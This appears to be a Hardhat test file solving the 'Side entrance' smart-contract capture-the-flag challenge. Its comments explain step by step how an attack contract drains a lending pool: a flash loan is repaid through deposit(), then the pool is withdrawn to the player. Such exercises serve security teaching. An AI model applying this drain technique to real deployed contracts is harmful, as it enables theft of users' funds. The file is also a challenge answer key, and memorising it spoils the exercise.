const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Side entrance', function () {
    let deployer, player;
    let pool;

    const ETHER_IN_POOL = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy pool and fund it
        pool = await (await ethers.getContractFactory('SideEntranceLenderPool', deployer)).deploy();
        await pool.deposit({ value: ETHER_IN_POOL });
        expect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL);

        // Player starts with limited ETH in balance
        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

    });

    it('Execution', async function () {
        /** 
         * The attacker begins by deploying their attack contract, `AttackSideEntrance`.
         * - `AttackSideEntrance` is designed to exploit the vulnerable `SideEntranceLenderPool` contract.
         * - The contract is deployed with the following parameters:
         *   1. `pool.address`: The address of the vulnerable pool contract (`SideEntranceLenderPool`).
         *   2. `player.address`: The address of the player (attacker) who will ultimately receive the stolen funds.
         */
        this.attackerContract = await (await ethers.getContractFactory('AttackSideEntrance', player)).deploy(
            pool.address, player.address
        );
    
        /**
         * The `attack()` function is called on the `AttackSideEntrance` contract.
         * This initiates the exploit by performing the following steps:
         *
         * 1. **Flash Loan Request**:
         *    - The attacker contract requests a flash loan of the entire balance of the pool by calling `pool.flashLoan(address(pool).balance);`.
         *    - The `flashLoan()` function of the `SideEntranceLenderPool` contract sends the entire pool balance to the `AttackSideEntrance` contract by invoking the `execute()` function.
         * 
         * 2. **Loan Repayment Through Deposit**:
         *    - Inside the `execute()` function of the attacker contract, the borrowed Ether is deposited back into the pool using `pool.deposit{value: msg.value}();`.
         *    - This increases the balance of the attacker within the pool, making it appear as though the flash loan has been repaid, even though the pool's actual balance remains the same.
         *
         * 3. **Withdrawal of Funds**:
         *    - After the flash loan is "repaid," the `attack()` function proceeds to call `pool.withdraw();`.
         *    - This withdraws the full balance of the pool, which now belongs to the attacker due to the previous deposit.
         *
         * 4. **Transfer to Attacker**:
         *    - The withdrawn funds are then sent to the attacker's address (`player.address`) using `player.call{value: address(this).balance}("");`.
         *    - This completes the exploit, effectively draining the entire pool balance and transferring it to the attacker.
         */
        await this.attackerContract.attack();
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player took all ETH from the pool
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
        expect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL);
    });
});
